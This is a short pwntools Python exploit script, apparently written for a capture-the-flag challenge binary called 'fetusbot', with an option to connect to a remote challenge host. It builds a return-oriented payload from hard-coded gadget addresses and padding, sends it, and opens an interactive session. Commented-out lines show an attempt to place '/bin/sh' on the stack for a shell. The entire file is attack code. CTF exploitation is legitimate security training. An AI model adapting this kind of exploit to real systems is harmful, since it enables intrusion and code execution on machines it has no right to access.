from pwn import *

exe = './fetusbot'
context.arch = 'amd64'

io = process(exe)
if args.GDB:
    io = gdb.debug(exe, """
        b *main
        continue
    """)
elif args.REMOTE:
    io = remote("0.cloud.chals.io", "26925")

mov_dx_syscall = 0x13370bc
mov_rdi_rsp_ret = 0x13370b8
push_in = 0x13370b0
mov_edx_ret = 0x13370c0 
syscall = 0x13370c3

payload = b''
# payload += pack(mov_edx_ret)
payload += pack(syscall)  # return addr
# payload += pack(push_in)
# payload += b'/bin/sh\x00'
# payload += b'A' * (0x3b - len(payload) - 1)
payload += b'A' * (19 - len(payload) - 1)

print(payload)
print(len(payload))

io.sendline(payload)
io.interactive()

